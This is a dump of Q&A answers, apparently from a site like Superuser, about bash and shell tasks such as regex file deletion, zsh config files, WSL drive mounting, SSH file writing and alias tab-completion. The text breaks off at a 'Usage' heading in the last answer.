"Delete files with regular expression","392872","<bash><unix><regex><rm>","56","<p>You can use the following command to delete all files matching your criteria:</p>

<pre><code>ls | grep -P ""^A.*[0-9]{2}$"" | xargs -d""\n"" rm
</code></pre>

<p>How it works:</p>

<ol>
<li><p><code>ls</code> lists all files (one by line since the result is piped).</p></li>
<li><p><code>grep -P ""^A.*[0-9]{2}$""</code> filters the list of files and leaves only those that match the regular expression <code>^A.*[0-9]{2}$</code></p>

<ul>
<li><p><code>.*</code> indicates any number of occurrences of <code>.</code>, where <code>.</code> is a wildcard matching any character.</p></li>
<li><p><code>[0-9]{2}</code> indicates exactly two occurrences of <code>[0-9]</code>, that is, any digit.</p></li>
</ul></li>
<li><p><code>xargs -d""\n"" rm</code> executes <code>rm line</code> once for every <code>line</code> that is piped to it.</p></li>
</ol>

<blockquote>
  <p>Where am I wrong?</p>
</blockquote>

<p>For starters, <code>rm</code> doesn't accept a regular expression as an argument. Besides the wildcard <code>*</code>, every other character is treated literally.</p>

<p>Also, your regular expression is slightly off. For example, <code>*</code> means any occurrences of <code>...</code> in a regular expression, so <code>A*</code> matches <code>A</code>, <code>AA</code>, etc. and even an empty string.</p>

<p>For more information, visit <a href=""http://www.regular-expressions.info/tutorial.html"" rel=""noreferrer"">Regular-Expressions.info</a>.</p>
"
"What does echo $((2#$1)) exactly do?","1162555","<bash>","55","<p>man bash</p>

<pre class=""lang-none prettyprint-override""><code>   echo [-neE] [arg ...]
          Output  the  args,  separated  by spaces, followed by a newline.
          The return status is 0 unless a write error occurs.   If  -n  is
          specified, the trailing newline is suppressed.  If the -e option
          is given,  interpretation  of  the  following  backslash-escaped
          characters  is  enabled.
</code></pre>

<p>[...]</p>

<pre class=""lang-none prettyprint-override""><code>   Arithmetic Expansion
       Arithmetic  expansion allows the evaluation of an arithmetic expression
       and the substitution of the result.  The format for  arithmetic  expan‐
       sion is:

              $((expression))
</code></pre>

<p>[...]</p>

<pre class=""lang-none prettyprint-override""><code>   Constants with a leading 0 are interpreted as octal numbers.  A leading
   0x or  0X  denotes  hexadecimal.   Otherwise,  numbers  take  the  form
   [base#]n,  where the optional base is a decimal number between 2 and 64
   representing the arithmetic base, and n is a number in that  base.   If
   base#  is omitted, then base 10 is used.  When specifying n, the digits
   greater than 9 are represented by the lowercase letters, the  uppercase
   letters, @, and _, in that order.  If base is less than or equal to 36,
   lowercase and uppercase letters may be used interchangeably  to  repre‐
   sent numbers between 10 and 35.
</code></pre>
"
"How to SSH into WSL","1123552","<windows-10><bash><ssh><windows-subsystem-for-linux>","55","<p>Change the 22 port to a other one,such as 2222,in the file <code>/etc/ssh/sshd_config</code>,then restart the ssh service by the commond <code>sudo service ssh --full-restart</code>,you will successfully login.But I don't know the reason.</p>

<p>I also try use it as a remote gdb server for visual studio by VisualGDB,it not works well.
VisualGDB will support it in the next version as the offical website shows.The link is <a href=""https://sysprogs.com/w/forums/topic/visualgdb-with-windows-10-anniversary-update-linux-support/#post-9274"" rel=""noreferrer"">https://sysprogs.com/w/forums/topic/visualgdb-with-windows-10-anniversary-update-linux-support/#post-9274</a></p>
"
"How to get infinite command history in bash?","479726","<bash><history>","55","<p>it is indeed <strong>not</strong> (well) documented and I guess 99% of the bash user on this planed do set HISTSIZE to a veeery large number.</p>

<p>In the GNU bash history is handled through the mighty readline library. The library has the option to limit the history size (""stifle"" in readline jargon) or not and bash simply sets the readline history to stifled/unstifled. If you look into e.g. GNU bash version 4.2, file variables.c, line 4443, function void sv_histsize (char*)
you'll find this comment (and the whole stifling/unstifling in the function that follows):</p>

<blockquote>
  <p>/* What to do after the HISTSIZE or HISTFILESIZE variables change.<br>
  If there is a value for this HISTSIZE (and it is numeric), then stifle
  the history.  Otherwise, if there is NO value for this variable,<br>
  unstifle the history.  If name is HISTFILESIZE, and its value is<br>
  numeric, truncate the history file to hold no more than that many<br>
  lines. */</p>
</blockquote>

<p>So this should do the trick:</p>

<pre><code>export HISTSIZE=""""
</code></pre>

<p>And also this (if you feel defiant):</p>

<pre><code>export HISTSIZE=""GOTCHA""
</code></pre>

<p>Hope this helps.</p>
"
"iTerm/zsh not reading .bashrc OR .bash_profile","866683","<macos><bash><terminal><zsh><bashrc>","55","<p>The answer is simple, almost evident in the question. Here's why:</p>

<p>The shell <code>zsh</code> is not <code>bash</code>, it is a different shell. <code>zsh</code> will not use the default files built for <code>bash</code>: <code>.bashrc</code> or <code>.bash_profile</code>. These two files are startup configuration files for <code>bash</code>. <code>zsh</code> has its own startup configuration files.</p>

<p>You can find out more about them here on the <code>zsh</code> <a href=""http://zsh.sourceforge.net/Intro/intro_3.html"">intro page</a>:</p>

<blockquote>
  <p>There are five startup files that zsh will read commands from:</p>

<pre><code>$ZDOTDIR/.zshenv
$ZDOTDIR/.zprofile
$ZDOTDIR/.zshrc
$ZDOTDIR/.zlogin
$ZDOTDIR/.zlogout
</code></pre>
</blockquote>

<p>You had mentioned your aliases don't work, to fix this, apply your aliases here like so:</p>

<p><code>~/.zshrc</code></p>

<pre><code>alias sz='source ~/.zshrc'     # Easily source your ~/.zshrc file.
alias ls='pwd; ls --color'     # Alias 'ls' to: pwd + ls + color.
</code></pre>
"
"how to cd into a thumb drive from terminal ( Mac OSX )","304267","<mac><macos><bash><terminal>","55","<pre><code># cd /Volumes &amp;&amp; ls
</code></pre>

<p>It will show you the directory location of all mounted volumes. Then just cd into the drive you want.</p>
"
"what is the difference between ""command && command"" and ""command ; command""","619016","<linux><ubuntu><command-line><bash><shell>","54","<p><code>&amp;&amp;</code> is a logical operator. <code>;</code> is simple sequencing.</p>

<p>In <code>cmd1 &amp;&amp; cmd2</code>, cmd2 will only be run if cmd1 exits with a successful return code.</p>

<p>Whereas in <code>cmd1; cmd2</code>, cmd2 will run regardless of the exit status of cmd1 (assuming you haven't set your shell to exit on all failure in your script or something).</p>

<p>On a related note, with <code>cmd1 || cmd2</code>, using the <code>||</code> 'OR' logical operator, cmd2 will only be run if cmd1 fails (returns a non-zero exit code).</p>

<p>These logical operators are sometimes used in scripts in place of a basic if statement. For example,</p>

<pre><code>if [[ -f ""$foo"" ]]; then mv ""$foo"" ""${foo%.txt}.mkd""; fi
</code></pre>

<p>...can be more concisely achieved with:</p>

<pre><code>[[ -f ""$foo"" ]] &amp;&amp; mv ""$foo"" ""${foo%.txt}.mkd""
</code></pre>
"
"Find files filtered by multiple extensions","126290","<bash><find><filenames><file-extension>","54","<p>You can combine different search expressions with the logical operators <code>-or</code> or <code>-and</code>, so your case can be written as</p>

<pre><code>find . -type f \( -name ""*.shtml"" -or -name ""*.css"" \)
</code></pre>

<p>This also show that you do not need to escape special shell characters when you use quotes.</p>

<p><strong>Edit</strong></p>

<p>Since <code>-or</code> has lower precedence than the implied <code>-and</code> between <code>-type</code> and the first <code>-name</code> put name part into parentheses as suggested by Chris.</p>
"
"How to remotely write to a file using SSH","400714","<bash><ssh>","53","<p>You can use the ""cat"" command to create the remote file. </p>

<pre><code>echo 'Some Text' | ssh user@remotehost -T ""cat &gt; /remotefile.txt""
</code></pre>

<p>The <code>-T</code> disables pseudo-terminal allocation and stops you from getting the message,</p>

<blockquote>
  <p>Pseudo-terminal will not be allocated because stdin is not a terminal.</p>
</blockquote>
"
"Windows 10 build 14316: Ctrl + v doesn't work on Bash on Ubuntu on Windows","1064813","<bash><windows-10><copy-paste><windows-insider><windows-subsystem-for-linux>","53","<p>Why don't you guys just Right Click? here is how to enable copy and paste:</p>

<ol>
<li>Go to the top of the bash window, right click, go to properties</li>
<li><p>Check the box that says Quick edit Mode, and you are set!</p>

<p><a href=""https://i.stack.imgur.com/7HPM2.png""><img src=""https://i.stack.imgur.com/7HPM2.png"" alt=""Copy and Paste Enabling on Bash for Windows 10""></a></p></li>
</ol>

<p>Good day!</p>

<p>-- 
Activate Quick Edit mode, then mouse left-click is select text, right DOUBLE-click is PASTE</p>
"
"Avoid unwanted path in Zip file","119649","<macos><bash><zip><path><shell-script>","53","<p>Your script should use <code>cd</code> or <code>pushd</code> and <code>popd</code> to move into the directory that will be the root of the archive <em>before</em> issuing the <code>zip</code> command.  How you do this exactly will depend on how the script knows what to zip up.  But, if you want <em>/Users/me/development/something/folder</em> zipped with internal paths of just <em>./folder</em>, you'd need to do this:</p>

<pre><code>pushd /Users/me/development/something
zip -r /path/to/out.zip ./folder/
popd
</code></pre>

<p>That will result in your <em>out.zip</em> containing the relative paths you want.</p>

<p>If you need assistance with scripting that, you'll need to show us your script.</p>
"
"Accessing removable media in Bash on Windows","1109993","<windows-10><bash><windows-subsystem-for-linux><windows-10-v1607>","52","<p>Good news, it is now possible to mount USB media (including formatted as FAT) and network shares with drvfs on Windows 10:</p>

<p>Mount removable media: (e.g. D:)</p>

<pre><code>$ sudo mkdir /mnt/d
$ sudo mount -t drvfs D: /mnt/d
</code></pre>

<p>To safely unmount</p>

<pre><code>$ sudo umount /mnt/d
</code></pre>

<p>You can also mount network shares without smbfs:</p>

<pre><code>$ sudo mount -t drvfs '\\server\share' /mnt/share
</code></pre>

<p>You need at least Build 16176 so you might have to opt-in to the Windows Insider programm and then update Windows. Source: <a href=""https://blogs.msdn.microsoft.com/wsl/2017/04/18/file-system-improvements-to-the-windows-subsystem-for-linux/"" rel=""noreferrer"">https://blogs.msdn.microsoft.com/wsl/2017/04/18/file-system-improvements-to-the-windows-subsystem-for-linux/</a></p>
"
"How to ""unextract"" a zip file?","550837","<linux><bash><zip>","52","<p><a href=""https://superuser.com/users/105557/jjlin"">jjlin</a>'s answer is the way to go. I just want to add a few choices for directories:</p>

<ul>
<li><p>Delete all extracted <strong>files, no directories</strong>:</p>

<pre><code>unzip -lqq file.zip | gawk -F""  "" '{print $NF;}' |
  while IFS= read -r n; do rm ""$n""; done
</code></pre></li>
<li><p>Delete extracted files and <strong>empty</strong> directories only</p>

<pre><code>unzip -lqq file.zip | gawk -F""  "" '{print $NF;}' |
  while IFS= read -r n; do rm ""$n""; done; rmdir *
</code></pre>

<p>With no options, <code>rmdir</code> deletes only empty directories, it will leave files and non-empty folders alone so you can safely run it on <code>*</code>.</p></li>
<li><p>Delete <strong>everything</strong> extracted, but prompt for a confirmation before each deletion:</p>

<pre><code>unzip -lqq file.zip | gawk -F""  "" '{print $NF;}' |
  while IFS= read -r n; do rm -ri ""$n""; done; rmdir *
</code></pre>

<p>The <code>-i</code> flag will cause <code>rm</code> to prompt before every removal, you can choose Yes or No. </p></li>
<li><p>Delete <strong>everything</strong> extracted, directories included:</p>

<pre><code>unzip -lqq file.zip | gawk -F""  "" '{print $NF;}' |
  while IFS= read -r n; do rm -rf ""$n""; done
</code></pre></li>
</ul>
"
"How to create symbolic links to all files (class of files) in a directory?","633605","<linux><bash><symbolic-link>","52","<p><code>ln</code> does take multiple arguments, but don't forget to give a target directory in that case.</p>

<p>So, in your example <code>.</code> is the target directory, so it should be as easy as</p>

<pre><code>ln -s ../source/*.bar .
</code></pre>

<p>From <code>man ln</code>; the command above uses the 3rd form:</p>

<pre><code>ln [OPTION]... [-T] TARGET LINK_NAME   (1st form)
ln [OPTION]... TARGET                  (2nd form)
ln [OPTION]... TARGET... DIRECTORY     (3rd form)
ln [OPTION]... -t DIRECTORY TARGET...  (4th form)
</code></pre>

<blockquote>
  <ul>
  <li>In  the  1st form, create a link to TARGET with the name LINK_NAME.</li>
  <li>In       the 2nd form, create a link to TARGET in the current directory. </li>
  <li>In the 3rd  and  4th  forms, create links to each TARGET in DIRECTORY.</li>
  </ul>
</blockquote>
"
"How can I sort all files by size in a directory?","368784","<bash><unix><shell>","52","<p><code>ls(1)</code> <code>/sort</code>:</p>

<pre><code>-S     sort by file size
</code></pre>
"
"How do I use a Bash variable (string) containing quotes in a command?","360966","<bash>","52","<p>Short answer: see <a href=""http://mywiki.wooledge.org/BashFAQ/050"" rel=""noreferrer"">BashFAQ #50</a> (""I'm trying to put a command in a variable, but the complex cases always fail!"").</p>

<p>Long answer: Putting commands (or parts of commands) into variables and then getting them back out intact is complicated.  When the shell expands a variable on the command line, if the variable was in double-quotes it's not parsed; if it was not in quotes, spaces in it are parsed as argument breaks, but quotes and escape are not parsed.  In either case, putting quotes in the variable's value does nothing useful.</p>

<p>Usually, the best way to do this sort of thing is using an array instead of a simple text variable:</p>

<pre><code>FLAGS=(--archive --exclude=""foo bar.txt"")
rsync ""${FLAGS[@]}"" dir1 dir2
</code></pre>
"
"Why is Bash everywhere (in most if not all Linux distributions)?","61727","<linux><bash><shell>","51","<p>History (acquired not through research but through spending entirely too much time hanging out with Bell Labs people):</p>

<ol>
<li><p>In the beginning (if you consider the beginning to be Unix Version 7) was the Bourne shell.  Steve Bourne was the first to show that the shell which controlled the user's interaction could be a user program and not a special part of the operating system.  A historic breakthrough.  The shell itself was relatively clean for scripting, but had no command-line editing or job control.  Bourne's <em>Introduction to the Unix Shell</em> is still useful for beginning users today.</p>

<p><strong>Edit</strong>: I've ignored some ""prehistory"" from Ken Thompson and John Mashey, also from Multics.  I'm sure Bourne was aware of all this work (he was in the same lab, 1127, at Bell Labs), but Bourne's shell was definitive, and the earlier work had little influence except as interpreted by Steve Bourne.  For example, although Ken later wrote the Plan 9 C compiler and was very influential on Plan 9, but Tom Duff's paper on the Plan 9 shell (rc) mentions only Bourne's shell, not Thompson's.</p></li>
<li><p>The shell is just a user program, so anybody can write one.  As Version 7 Unix was being created in New Jersey, Berkeley Unix was being created in California.  Bill Joy at Berkeley wrote <code>csh</code>, the C shell.  Joy added job control and history, and later command-line editing, but was not aware of Bourne's work and so based his language on the Thompson shell (which I considered ""prehistoric"" in the previous bullet).  The Unix community loved job control, but they also loved Bourne's language.  For a not-particularly-good polemic against the csh language, see <a href=""http://www.faqs.org/faqs/unix-faq/shell/csh-whynot/"">Csh Programming Considered Harmful</a>.  For a time, many people used <code>csh</code> interactively for its job-control and history features, but used Bourne's <code>sh</code> to write scripts.  This situation was less than ideal.</p>

<p><strong>Edit</strong>: Thanks to DigitalRoss for straightening me out on the chronology of <code>csh</code>.  Since I got my education from people who refer to BSD as ""the Berkeley heresy"", I was pretty short of facts there.</p></li>
<li><p>Dave Korn at Bell Labs did a brilliant re-engineering of the Bourne shell to produce the Korn shell (ksh).  It was fully backward compatible with Bourne shell <code>sh</code> but provided a boatload of invaluable improvements.  <code>ksh</code> became the basis of a POSIX standard and was shipped standard with Sun software.  (This despite the fact that Bill Joy left Berkeley to help found Sun and was one of their leading software guys.)</p></li>
<li><p>Bell Labs and AT&amp;T stupidly fail to make <code>ksh</code> open source. <code>ksh88</code> is widely used, but having sources is not legal.  Certain people become so addicted that they become digital criminals.</p>

<p><strong>Edit</strong>: Was this really so stupid?   Hard to know. Berkeley was already giving Unix away, and other corporations were soon to follow, but this was still the era when the Corporate Masters believed in charging for Unix.  But the results: AT&amp;T Unix is dead, after having been sold off to various parties any number of times. BSD and its derivatives are alive and well, but these upstart things called ""Linux"" and ""GNU"" have a huge fraction of mindshare that once belonged to Bell Labs.</p></li>
<li><p>The Free Software Foundation does a ""clean-room"", from scratch implementation of a POSIX shell, taking all of Dave Korn's ideas as then current, plus in usual FSF style adding new features of their own, such as programmable completion.  They call it the ""Bourne again"" shell, or <code>bash</code>.</p></li>
<li><p>In the middle 1990s AT&amp;T open-sources <code>ksh93</code>, but by then it is too late for widespread adoption.  The licensing agreement is weirdly nonstandard.  <code>bash</code> and <code>ksh</code> diverge, and <code>ksh</code> never achieves market share commensurate with its place in history.</p></li>
</ol>

<p>Lessons:</p>

<ul>
<li><p>The first adequate product to market wins (sh).</p></li>
<li><p>People love new features (job control, command completion), but they love them even more when their old scripts continue to work.</p></li>
<li><p><strong>Edit</strong>: Professors of engineering should leave history to historians of science :-)</p></li>
</ul>
"
"Looping Through Subdirectories and Running a Command in Each","44787","<linux><bash><shell><script>","51","<pre><code>for dir in ~/projects/git/*; do (cd ""$dir"" &amp;&amp; git pull); done
</code></pre>
"
"How to disable Bash on Windows notification sound effect","1108120","<windows-10><bash><windows-subsystem-for-linux><windows-10-v1607>","51","<p>The <a href=""https://superuser.com/a/1108171/232984"">answer</a> given by <a href=""https://superuser.com/users/168043/wouter"">Wouter</a> works better overall once set up, but it can be slightly confusing to get working as the correct option doesn't always appear. Follow these steps:</p>

<ul>
<li>Right click the volume control in the Windows taskbar</li>
<li>Open the Volume Mixer</li>
<li>Open the Bash on Windows console</li>
<li>Do something to trigger the console making the notification sound (e.g. press backspace on an empty line). If you've disabled the notification using the alternative method below, you'll have to undo it.</li>
<li>Now a <strong>Console Window Host</strong> option should have appeared in the Volume Mixer (you might have to scroll right)</li>
<li>Mute its sound setting</li>
</ul>

<p><a href=""https://i.stack.imgur.com/aKIda.jpg"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/aKIda.jpg"" alt=""Volume mixer with Console Window Hos""></a></p>

<h2>Previous/alternative method</h2>

<p>You can simply run the following command from within your Windows Bash shell [<a href=""https://github.com/Microsoft/BashOnWindows/issues/715"" rel=""noreferrer"">source</a>]:</p>

<pre><code>echo ""set bell-style none"" &gt;&gt; ~/.inputrc
</code></pre>

<p>or else edit <code>.inputrc</code> manually with a text-editor to add <code>set bell-style none</code> on it's own line.</p>

<p>You'll need to restart your currently open bash shell before it takes affect.</p>

<p>This will only work for your current user, and won't help if you ssh into other accounts (unless you run that command again for each account).</p>
"
"How can I get the scp command to overwrite the destination folder","649186","<bash><ssh><scp>","51","<p>Like Levans, I have been unable to replicate this, but have you considered using rsync over ssh instead?  If you're copying large numbers of files, rsync may be a better option than scp.  There are a number of good guides to it online, such as these:</p>

<p><a href=""http://troy.jdmz.net/rsync/index.html"" rel=""noreferrer"">http://troy.jdmz.net/rsync/index.html</a>
<a href=""https://calomel.org/rsync_tips.html"" rel=""noreferrer"">https://calomel.org/rsync_tips.html</a></p>

<p>That first link deals with automated backups via cron, so some of the instructions (like creating an ssh key without a passphrase) may not be relevant to you.</p>
"
"Using the Terminal keybindings with bash on macOS","124336","<macos><bash><keyboard-shortcuts><terminal.app>","50","<p>One way to deal with 'meta' key sequences not working on the OS X terminal is to assign specific character sequences to particular keypresses. For those of us with non-US keyboards, this is often a better solution than the ""Use option as meta"" setting mentioned in the comments of other answers. (Many international Mac keyboards are essentially unusable for development work without the Option/alt key because certain critical characters are otherwise unavailable. There's no <kbd>#</kbd> on a UK Mac keyboard, for example.)</p>

<p>To get word-left and word-right working for bash, I've used the ""Keyboard"" section of the Settings in Terminal. You can tell it to generate particular code sequences when particular keypresses are made. I've got mine configured so that <kbd>alt</kbd>+<kbd>◀</kbd> generates <code>\033b</code> (that's actually two characters: Esc, and then a lowercase b) and <kbd>alt</kbd>+<kbd>▶</kbd> generates <code>\033f</code> (i.e., <code>Esc f</code>). This lets you use the arrow keys with the option key held down to get the word left and right behaviour.</p>

<p>What I've not yet worked out is how to get the <kbd>Esc</kbd> key to work - in theory you should be able to use that for 'meta' sequences but it appears not to work. (So just typing <kbd>Esc</kbd>+<kbd>b</kbd> should go back one word.)</p>

<p>If you have a US keyboard layout, or some other keyboard in which Apple have seen fit to provide all the keys you actually need, then as others have suggested, ""Use option as meta key"" (also on the Keyboard section of Terminal's settings) is probably a better choice because you'll be able to get to any meta key combination. With that switched on, <kbd>Alt</kbd>+<kbd>b</kbd> works as expected.</p>
"
"What exactly is <() in bash (and =() in zsh)?","1059781","<linux><bash><shell><zsh>","50","<p>This is called process substitution.</p>

<p>The <code>&lt;(list)</code> syntax is supported by both, <a href=""https://www.gnu.org/software/bash/manual/html_node/Process-Substitution.html#Process-Substitution"" rel=""noreferrer""><code>bash</code></a> and <a href=""http://zsh.sourceforge.net/Doc/Release/Expansion.html#Process-Substitution"" rel=""noreferrer""><code>zsh</code></a>. It provides a way to pass the output of a command (<code>list</code>) to another command when using a pipe (<code>|</code>) is not possible. For example when a command just does not support input from <code>STDIN</code> or you need the output of multiple commands: </p>

<pre><code>diff &lt;(ls dirA) &lt;(ls dirB)
</code></pre>

<hr>

<p><code>&lt;(list)</code> connects the output of <code>list</code> with a file in <code>/dev/fd</code>, if supported by the system, otherwise a named pipe (FIFO) is used (which also depends on support by the system; neither manual says what happens if both mechanisms are not supported, presumably it aborts with an error). The name of the file is then passed as argument on the command line.</p>

<hr>

<p><code>zsh</code> additionally supports <code>=(list)</code> as possible replacement for <code>&lt;(list)</code>. With <code>=(list)</code> a temporary file is used instead of file in <code>/dev/fd</code> or a FIFO. It can be used as a replacement for <code>&lt;(list)</code> if the program needs to lseek in the output.</p>

<p>According to the <a href=""http://zsh.sourceforge.net/Doc/Release/Expansion.html#Process-Substitution"" rel=""noreferrer"">ZSH manual</a> there might also be other issues with how <code>&lt;(list)</code> works:</p>

<blockquote>
  <p>The <code>=</code> form is useful as both the <code>/dev/fd</code> and the named pipe implementation of <code>&lt;(...)</code> have drawbacks. In the former case, some programmes may automatically close the file descriptor in question before examining the file on the command line, particularly if this is necessary for security reasons such as when the programme is running setuid. In the second case, if the programme does not actually open the file, the subshell attempting to read from or write to the pipe will (in a typical implementation, different operating systems may have different behaviour) block for ever and have to be killed explicitly. In both cases, the shell actually supplies the information using a pipe, so that programmes that expect to lseek (see man page <code>lseek(2)</code>) on the file will not work.</p>
</blockquote>
"
"Can I save these documents on a dying machine from oblivion?","1268868","<linux><bash><ssd><fedora><crash>","50","<p>here's an example libasound program with just enough definitions to get basic 2-channel 44.1k wav output going without the headers.</p>

<p>EDIT: I'm actually not sure if straight up dumping the data as wav would work, as noise when recording could easily damage it, but you can probably do something like a sine wave of bits at high frequency which is more reliable</p>

<p>EDIT2: if aplay is present and works you can also use that and just write a program that output raw audio and pipe it into aplay or anything that can play audio</p>

<p>EDIT3: modified it to not use any headers at all</p>

<p>if -lasound doesn't compile, add -L/path/where/libasound/is/located</p>

<pre><code>/*
    gcc alsa_noheader.c -lasound
    cat stuff.wav | ./a.out
*/

typedef unsigned int uint;
typedef unsigned long ulon;

int printf(char*, ...);
void* malloc(long);
long read(int fd, void* buf, ulon count);

int snd_pcm_open(void**, char*, int, int);
ulon snd_pcm_hw_params_sizeof();
int snd_pcm_hw_params_any(void*, void*);
int snd_pcm_hw_params_set_access(void*, void*, int);
int snd_pcm_hw_params_set_format(void*, void*, int);
int snd_pcm_hw_params_set_channels(void*, void*, uint);
int snd_pcm_hw_params_set_rate_near(void*, void*, uint*, int*);
int snd_pcm_hw_params(void*, void*);
int snd_pcm_hw_params_get_period_size(void*, ulon*, int*);
long snd_pcm_writei(void*, void*, uint);
int snd_pcm_prepare(void*);
int snd_pcm_drain(void*);
int snd_pcm_close(void*);

int main(int argc, char* argv[])
{
    void* pcm;
    void* params;

    int rate;
    int nchannels;
    ulon frames;
    void* buf;
    int bufsize;
    long nread;

    snd_pcm_open(&amp;pcm, ""default"", 0, 0);
    params = malloc(snd_pcm_hw_params_sizeof());
    snd_pcm_hw_params_any(pcm, params);

    /* 3 = rw_interleaved */
    snd_pcm_hw_params_set_access(pcm, params, 3);

    /* 2 = 16-bit signed little endian */
    snd_pcm_hw_params_set_format(pcm, params, 2);

    /* 2 channels */
    nchannels = 2;
    snd_pcm_hw_params_set_channels(pcm, params, nchannels);

    /* sample rate */
    rate = 44100;
    snd_pcm_hw_params_set_rate_near(pcm, params, &amp;rate, 0);

    snd_pcm_hw_params(pcm, params);
    snd_pcm_hw_params_get_period_size(params, &amp;frames, 0);

    bufsize = frames * nchannels * 2;
    buf = malloc(bufsize);

    /* read file from stdin */
    while (nread = read(0, buf, bufsize) &gt; 0)
    {
        if (snd_pcm_writei(pcm, buf, frames) == -29)
        {
            printf(""W: underrun\n"");
            snd_pcm_prepare(pcm);
        }
    }

    snd_pcm_drain(pcm);
    snd_pcm_close(pcm);

    return 0;
}
</code></pre>
"
"How to include environment variable in bash line CURL?","835587","<bash><environment-variables>","50","<p>Inside single-quotes, the shell expands nothing.  Place them inside double-quotes instead:</p>

<pre><code>curl -u &lt;my-api-token&gt;: \
  -X POST https://api.pushbullet.com/v2/pushes \
  --header 'Content-Type: application/json' \
  --data-binary '{""type"": ""note"", ""title"": ""'""$TR_TORRENT_NAME""'"", \
  ""body"": ""'""$TR_TORRENT_NAME completed""'.""}'
</code></pre>

<p>Let's examine how this works by looking at:</p>

<pre><code>$ TR_TORRENT_NAME=MyTorrent
$ echo '{""type"": ""note"", ""title"": ""'""$TR_TORRENT_NAME""'"", ""body"": ""'""$TR_TORRENT_NAME completed""'.""}'
{""type"": ""note"", ""title"": ""MyTorrent"", ""body"": ""MyTorrent completed.""}
</code></pre>

<p>When the shell variable appears, it is always inside double-quotes. Consequently, it is properly expanded.</p>

<p>Quoting like this is a bit subtle.  We have single-quoted strings that contain double-quotes as characters and are next to double-quoted strings.  To understand this better, let's take this fragment as a an example:</p>

<pre><code> ""'""$TR_TORRENT_NAME""'""
</code></pre>

<p>Taking each character in turn:</p>

<ol>
<li><p><code>""</code> is a literal double-quote character that is inside of a single-quoted string. (For brevity, the beginning of this string is not shown in this fragment.)</p></li>
<li><p><code>'</code> closes a single-quoted string.</p></li>
<li><p><code>""</code> opens a double-quoted string.</p></li>
<li><p><code>$TR_TORRENT_NAME</code> is a shell variable that is expanded inside double-quotes.</p></li>
<li><p><code>""</code> closes the double-quoted string.</p></li>
<li><p><code>'</code> opens a new single-quoted string.</p></li>
<li><p><code>""</code> places a double-quote character inside the single-quoted string.</p></li>
</ol>
"
"How can I get bash to perform tab-completion for my aliases?","436314","<bash><tab-completion>","49","<p>The following code, adapted from <a href=""https://stackoverflow.com/a/1793178/990363"">this Stack Overflow answer</a> and this <a href=""http://ubuntuforums.org/showthread.php?t=733397"" rel=""noreferrer"">Ubuntu Forums discussion thread</a> will add completions for all your defined aliases:</p>

<pre><code># Automatically add completion for all aliases to commands having completion functions
function alias_completion {
    local namespace=""alias_completion""

    # parse function based completion definitions, where capture group 2 =&gt; function and 3 =&gt; trigger
    local compl_regex='complete( +[^ ]+)* -F ([^ ]+) (""[^""]+""|[^ ]+)'
    # parse alias definitions, where capture group 1 =&gt; trigger, 2 =&gt; command, 3 =&gt; command arguments
    local alias_regex=""alias ([^=]+)='(\""[^\""]+\""|[^ ]+)(( +[^ ]+)*)'""

    # create array of function completion triggers, keeping multi-word triggers together
    eval ""local completions=($(complete -p | sed -Ene ""/$compl_regex/s//'\3'/p""))""
    (( ${#completions[@]} == 0 )) &amp;&amp; return 0

    # create temporary file for wrapper functions and completions
    rm -f ""/tmp/${namespace}-*.tmp"" # preliminary cleanup
    local tmp_file; tmp_file=""$(mktemp ""/tmp/${namespace}-${RANDOM}XXX.tmp"")"" || return 1

    local completion_loader; completion_loader=""$(complete -p -D 2&gt;/dev/null | sed -Ene 's/.* -F ([^ ]*).*/\1/p')""

    # read in ""&lt;alias&gt; '&lt;aliased command&gt;' '&lt;command args&gt;'"" lines from defined aliases
    local line; while read line; do
        eval ""local alias_tokens; alias_tokens=($line)"" 2&gt;/dev/null || continue # some alias arg patterns cause an eval parse error
        local alias_name=""${alias_tokens[0]}"" alias_cmd=""${alias_tokens[1]}"" alias_args=""${alias_tokens[2]# }""

        # skip aliases to pipes, boolean control structures and other command lists
        # (leveraging that eval errs out if $alias_args contains unquoted shell metacharacters)
        eval ""local alias_arg_words; alias_arg_words=($alias_args)"" 2&gt;/dev/null || continue
        # avoid expanding wildcards
        read -a alias_arg_words &lt;&lt;&lt; ""$alias_args""

        # skip alias if there is no completion function triggered by the aliased command
        if [[ ! "" ${completions[*]} "" =~ "" $alias_cmd "" ]]; then
            if [[ -n ""$completion_loader"" ]]; then
                # force loading of completions for the aliased command
                eval ""$completion_loader $alias_cmd""
                # 124 means completion loader was successful
                [[ $? -eq 124 ]] || continue
                completions+=($alias_cmd)
            else
                continue
            fi
        fi
        local new_completion=""$(complete -p ""$alias_cmd"")""

        # create a wrapper inserting the alias arguments if any
        if [[ -n $alias_args ]]; then
            local compl_func=""${new_completion/#* -F /}""; compl_func=""${compl_func%% *}""
            # avoid recursive call loops by ignoring our own functions
            if [[ ""${compl_func#_$namespace::}"" == $compl_func ]]; then
                local compl_wrapper=""_${namespace}::${alias_name}""
                    echo ""function $compl_wrapper {
                        (( COMP_CWORD += ${#alias_arg_words[@]} ))
                        COMP_WORDS=($alias_cmd $alias_args \${COMP_WORDS[@]:1})
                        (( COMP_POINT -= \${#COMP_LINE} ))
                        COMP_LINE=\${COMP_LINE/$alias_name/$alias_cmd $alias_args}
                        (( COMP_POINT += \${#COMP_LINE} ))
                        $compl_func
                    }"" &gt;&gt; ""$tmp_file""
                    new_completion=""${new_completion/ -F $compl_func / -F $compl_wrapper }""
            fi
        fi

        # replace completion trigger by alias
        new_completion=""${new_completion% *} $alias_name""
        echo ""$new_completion"" &gt;&gt; ""$tmp_file""
    done &lt; &lt;(alias -p | sed -Ene ""s/$alias_regex/\1 '\2' '\3'/p"")
    source ""$tmp_file"" &amp;&amp; rm -f ""$tmp_file""
}; alias_completion
</code></pre>

<p>For simple (command only, no arguments) aliases it will assign the original completion function to the alias; for aliases with arguments, it creates a wrapper function that inserts the extra arguments into the original completion function.</p>

<p>Unlike the scripts it has evolved from, the function respects quotes both for the alias command and its arguments (but the former have to be matched by the completion command, and cannot be nested), and it should reliably filter out aliases to <em>command lists</em> and <em>pipes</em> (which are skipped, as it is impossible to find out what to complete in them without re-creating the complete shell command line parsing logic).</p>

<h2>Usage</h2>

